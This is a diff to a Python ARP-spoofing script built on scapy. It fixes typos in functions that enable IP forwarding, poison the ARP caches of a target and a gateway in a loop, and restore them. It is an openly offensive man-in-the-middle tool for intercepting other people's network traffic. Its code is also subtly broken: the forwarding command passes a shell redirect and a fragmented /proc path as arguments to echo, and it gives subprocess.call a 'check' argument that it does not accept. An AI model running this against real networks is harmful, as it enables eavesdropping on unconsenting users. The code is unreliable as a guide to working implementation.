@@ -55,7 +55,7 @@ def toggle_port_forwarding():
     elif system_platform == "linux":
         print("[!] Enabling port forwarding temporarily...")
         try:
-            subrocess.call(["echo", "1", ">", "/proc", "/sys", "/net", "/ipv4", "/ip_forward"], check=True)
+            subprocess.call(["echo", "1", ">", "/proc", "/sys", "/net", "/ipv4", "/ip_forward"], check=True)
             print("[+] Port forwarding enabled.")
         except PermissionError:
             print("[-] Permission denied. Try running with sudo.")
@@ -184,7 +184,7 @@ def spoof(target_ip, spoof_ip, verbose):
 def restore(destination_ip, source_ip, verbose):
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
-    packet = scapy.Ether(dst=destnation_mac) / scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    packet = scapy.Ether(dst=destination_mac) / scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.sendp(packet, count=4, verbose=verbose or False)
 
 
@@ -197,7 +197,7 @@ def print_info(target, gateway, verbose):
         spoof(target, gateway, verbose)
         spoof(gateway, target, verbose)
         packet_sent += 2
-        print(f"\r{options.target:<15} {options.gateway:<15} {packet_sent}", end="", flush=True)
+        print(f"\r{target:<15} {gateway:<15} {packet_sent}", end="", flush=True)
         time.sleep(2)
 
 # Validate the ip addresses
